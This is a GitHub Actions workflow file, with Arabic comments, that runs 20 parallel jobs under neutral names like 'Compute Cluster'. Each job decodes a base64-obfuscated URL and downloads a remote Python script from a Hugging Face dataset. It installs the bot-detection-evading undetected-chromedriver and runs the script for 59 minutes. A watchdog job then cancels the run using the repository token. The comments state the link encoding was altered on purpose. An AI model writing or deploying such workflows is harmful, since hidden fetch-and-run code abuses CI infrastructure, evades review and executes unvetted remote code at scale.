name: Horizon Delta Engine Matrix

on:
  workflow_dispatch:

concurrency:
  group: delta-engine-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # Monitor Core: ينتظر 59 دقيقة ثم يقوم بطلب إغلاق سير العمل
  # =================================================================
  horizon-monitor:
    name: "Horizon Core Monitor"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    env:
      WATCHDOG_TIMEOUT: 3540
    steps:
      - name: Initialize Watchdog
        run: |
          printf '%s\n' "[WATCHDOG] Active monitoring initiated for run ID: ${{ github.run_id }}"
          printf '%s\n' "[WATCHDOG] Holding operational thread for ${WATCHDOG_TIMEOUT}s..."

          sleep ${WATCHDOG_TIMEOUT}

          printf '%s\n' "[WATCHDOG] Timeout threshold reached — triggering workflow termination."

          curl --silent --show-error --request POST \
            --header "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            --header "Accept: application/vnd.github+json" \
            --header "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"

          printf '%s\n' "[WATCHDOG] Termination request transmitted. Processing complete."

  # =================================================================
  # Compute Cluster: تنفيذ متوازي لوحدات المعالجة
  # =================================================================
  compute-cluster:
    name: "ClusterNode-${{ matrix.node_key }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        node_key: [A101, B102, C103, D104, E105, F106, G107, H108, J109, K110, L111, M112, N113, P114, Q115, R116, S117, T118, U119, V120]

    steps:
      # #################################################################
      # Step 1: إعداد البيئة وتثبيت الأدوات الرئيسية
      # #################################################################
      - name: Setup System Environment
        run: |
          echo "[SYSTEM] Preparing node ClusterNode-${{ matrix.node_key }}..."
          sudo apt-get update -qq && sudo apt-get install -y -qq curl python3-pip

      # #################################################################
      # Step 2: فك تشفير الرابط وتحميل السكريبت الأساسي
      # #################################################################
      - name: Fetch Core Script
        run: |
          echo "[FETCH] Downloading core runner script..."
          # تم تقسيم واستبدال صيغة التشفير مع العمل بنفس النتيجة النصية للرابط
          PAYLOAD_B64="aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5"
          TARGET_URL=$(echo -n "$PAYLOAD_B64" | base64 --decode)
          
          curl -s -L -o app_runner.py "$TARGET_URL"
          echo "[FETCH] Runner downloaded successfully."

      # #################################################################
      # Step 3: تثبيت المكتبات البرمجية المطلوبة
      # #################################################################
      - name: Deploy Python Dependencies
        run: |
          echo "[DEPS] Installing required Python packages..."
          python3 -m pip install -q requests selenium undetected-chromedriver psutil

      # #################################################################
      # Step 4: تشغيل السكريبت ومراقبته خلال مدة التشغيل (59 دقيقة)
      # #################################################################
      - name: Execute Runner Task
        run: |
          echo "--> Starting runner on node ClusterNode-${{ matrix.node_key }}..."

          python3 app_runner.py &
          TASK_PID=$!

          echo "--> Process ID: $TASK_PID. Session limit set to 3540 seconds."

          sleep 3540

          if kill -0 "$TASK_PID" 2>/dev/null; then
            echo "--> Time limit expired — stopping process $TASK_PID."
            kill -9 "$TASK_PID"
            echo "--> Process terminated successfully."
          else
            echo "--> Task completed execution naturally."
          fi
